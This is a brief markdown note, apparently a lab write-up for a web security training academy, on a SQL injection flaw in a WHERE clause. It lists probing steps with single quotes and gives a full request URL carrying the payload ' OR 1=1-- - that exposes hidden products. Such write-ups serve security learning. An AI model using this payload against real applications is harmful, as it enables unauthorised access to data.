---
tags:
  - sqli
---
## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

1. Inject a single quote and note the 500 status code
2. A second single quote fixes the error
3. Send the below request to show all items

```
https://0a52006203faa000da9b48c500b90071.web-security-academy.net/filter?category=Gifts'%20OR%201=1--%20-
```

